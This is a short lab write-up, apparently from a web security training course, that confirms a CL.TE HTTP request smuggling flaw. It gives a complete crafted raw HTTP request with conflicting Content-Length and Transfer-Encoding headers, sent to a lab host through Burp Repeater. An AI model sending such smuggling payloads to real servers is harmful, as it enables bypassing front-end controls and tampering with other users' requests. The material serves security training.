# Some cases of HTTP request smuggling

## 1. HTTP request smuggling, confirming a CL.TE vulnerability via differential responses

Using Burp Repeater, issue the following request twice:

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```

The second request should receive an HTTP 404 response.

*Note

Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
